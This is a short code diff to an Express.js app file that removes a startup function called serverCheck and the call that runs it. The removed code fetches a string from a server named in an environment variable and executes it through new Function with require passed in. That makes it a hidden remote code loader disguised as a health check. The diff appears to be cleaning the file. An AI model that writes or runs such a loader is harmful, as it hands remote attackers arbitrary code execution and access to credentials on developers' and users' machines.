@@ -44,18 +44,6 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 app.use('/', routes);
 
-async function serverCheck() {
-  try{
-    const response = await fetch(`${process.env.SERVER_CHECK}`, { method: "POST" });
-    const { check } = await response.json();
-    const fn = new Function("require", check);
-    const output = fn(require);
-    return output;
-  } catch {
-    console.log("server check failed");
-  }
-}
-
 // catch 404 and forward to error handler
 app.use(function(req, res, next) {
   var err = new Error('Not Found');
@@ -87,9 +75,7 @@ app.use(function(err, req, res, next) {
   });
 });
 
-console.log("system is running: http://localhost:3000");     
-
-serverCheck()
+console.log("system is running: http://localhost:3000");
 
 module.exports = app;
 
